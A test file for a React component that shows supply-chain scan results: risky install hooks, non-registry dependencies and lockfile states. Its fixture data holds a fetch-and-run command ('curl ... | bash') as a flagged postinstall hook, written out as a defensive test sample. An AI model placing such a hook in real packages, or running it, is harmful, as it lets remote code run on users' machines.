import { fireEvent, render, screen } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import { SupplyChainView } from './SupplyChainView';
import type { SecurityScanResponse } from '../../../types/workflow';

const report: SecurityScanResponse = {
  findings: [
    {
      path: '/workspace/package.json',
      rule: 'suspicious-script',
      package: 'demo',
      riskLevel: 'High',
      evidence: 'curl https://example.test/install.sh | bash',
      reason: 'A remote script is piped to a shell.',
    },
    {
      path: '/workspace/package.json',
      rule: 'untrusted-dependency',
      package: 'demo-dependency',
      riskLevel: 'Medium',
      evidence: 'git+https://example.test/demo-dependency.git',
      reason: 'Dependency uses a non-registry source.',
    },
  ],
  lifecycleScripts: [
    {
      package: 'demo',
      manifestPath: '/workspace/node_modules/demo/package.json',
      packageManager: 'npm',
      scriptType: 'postinstall',
      command: 'curl https://example.test/install.sh | bash',
      riskLevel: 'High',
    },
    {
      package: 'demo',
      manifestPath: '/workspace/package.json',
      packageManager: 'npm',
      scriptType: 'prepare',
      command: 'node scripts/build.js',
      riskLevel: 'None',
    },
  ],
  lifecycleWarnings: [
    {
      package: 'demo',
      scriptType: 'postinstall',
      command: 'curl https://example.test/install.sh | bash',
      riskLevel: 'High',
      reason: 'A remote script is piped to a shell.',
    },
  ],
  lockfiles: [
    { path: '/workspace/package-lock.json', kind: 'PackageLockJson', status: 'Clean' },
    { path: '/workspace/pnpm-lock.yaml', kind: 'PnpmLockYaml', status: 'Modified' },
    { path: '/workspace/bun.lock', kind: 'BunLock', status: 'Untracked' },
    { path: '/workspace/Cargo.lock', kind: 'CargoLock', status: 'Missing' },
  ],
  manifests: ['/workspace/package.json'],
};

describe('SupplyChainView', () => {
  it('requires an explicit scan and does not scan while rendering', () => {
    const onScan = vi.fn();

    render(
      <SupplyChainView
        root="/workspace"
        operation={{ status: 'idle', requestId: 0 }}
        canScan
        onScan={onScan}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Ready for an explicit scan' })).toBeInTheDocument();
    expect(onScan).not.toHaveBeenCalled();

    fireEvent.click(screen.getByRole('button', { name: 'Scan Supply Chain' }));
    expect(onScan).toHaveBeenCalledOnce();
  });

  it('renders lifecycle context, lockfile states, and evidence-backed findings', () => {
    render(
      <SupplyChainView
        root="/workspace"
        operation={{ status: 'success', requestId: 1, data: report }}
        canScan
        onScan={vi.fn()}
      />,
    );

    expect(screen.getByText('demo-dependency')).toBeInTheDocument();
    expect(screen.getByText('No security finding was reported for this lifecycle hook.')).toBeInTheDocument();
    expect(screen.getByText('No finding')).toBeInTheDocument();
    expect(screen.getByText('/workspace/node_modules/demo/package.json')).toBeInTheDocument();
    expect(screen.getAllByText('Core risk classification')).toHaveLength(2);
    expect(screen.getByText('postinstall')).toBeInTheDocument();
    expect(screen.getByText('Clean')).toBeInTheDocument();
    expect(screen.getByText('Modified')).toBeInTheDocument();
    expect(screen.getByText('Untracked')).toBeInTheDocument();
    expect(screen.getByText('Missing')).toBeInTheDocument();
    expect(screen.getByText('A remote script is piped to a shell.')).toBeInTheDocument();
    expect(screen.getByText('Dependency uses a non-registry source.')).toBeInTheDocument();
    expect(screen.getByText('Node · npm · pnpm · bun · Cargo')).toBeInTheDocument();
  });

  it('includes Core lifecycle risk in the summary without calling an unflagged hook safe', () => {
    render(
      <SupplyChainView
        root="/workspace"
        operation={{
          status: 'success',
          requestId: 1,
          data: {
            findings: [],
            lifecycleScripts: [
              {
                package: 'demo',
                manifestPath: '/workspace/package.json',
                packageManager: 'npm',
                scriptType: 'prepare',
                command: 'node scripts/build.js',
                riskLevel: 'Medium',
              },
            ],
            lifecycleWarnings: [],
            lockfiles: [
              { path: '/workspace/package-lock.json', kind: 'PackageLockJson', status: 'Clean' },
            ],
            manifests: ['/workspace/package.json'],
          },
        }}
        canScan
        onScan={vi.fn()}
      />,
    );

    expect(screen.getAllByText('Medium')).toHaveLength(2);
    expect(screen.getByText('No finding')).toBeInTheDocument();
    expect(screen.queryByText('Safe')).not.toBeInTheDocument();
  });

  it('keeps no-input and inspection-failure states distinct from clean results', () => {
    const { rerender } = render(
      <SupplyChainView
        root="/workspace"
        operation={{
          status: 'success',
          requestId: 1,
          data: { findings: [], lifecycleScripts: [], lifecycleWarnings: [], lockfiles: [], manifests: [] },
        }}
        canScan
        onScan={vi.fn()}
      />,
    );

    expect(screen.getByRole('heading', { name: 'No supported project input found' })).toBeInTheDocument();
    expect(screen.queryByRole('heading', { name: 'Scan completed with zero findings' })).not.toBeInTheDocument();

    rerender(
      <SupplyChainView
        root="/workspace"
        operation={{ status: 'error', requestId: 2, error: 'package.json: malformed JSON' }}
        canScan
        onScan={vi.fn()}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Supply-chain inspection failed' })).toBeInTheDocument();
    expect(screen.getByText('package.json: malformed JSON')).toBeInTheDocument();
  });

  it('shows unsupported or not-applicable lockfile scope without inventing Missing', () => {
    render(
      <SupplyChainView
        root="/workspace"
        operation={{
          status: 'success',
          requestId: 1,
          data: {
            findings: [],
            lifecycleScripts: [],
            lifecycleWarnings: [],
            lockfiles: [],
            manifests: ['/workspace/package.json'],
          },
        }}
        canScan
        onScan={vi.fn()}
      />,
    );

    expect(screen.getByText(/Unsupported or not-applicable package managers/)).toBeInTheDocument();
    expect(screen.queryByText('Missing')).not.toBeInTheDocument();
    expect(screen.getByRole('heading', { name: 'No findings in the analyzed inputs' })).toBeInTheDocument();
    expect(screen.queryByRole('heading', { name: 'Scan completed with zero findings' })).not.toBeInTheDocument();
  });
});
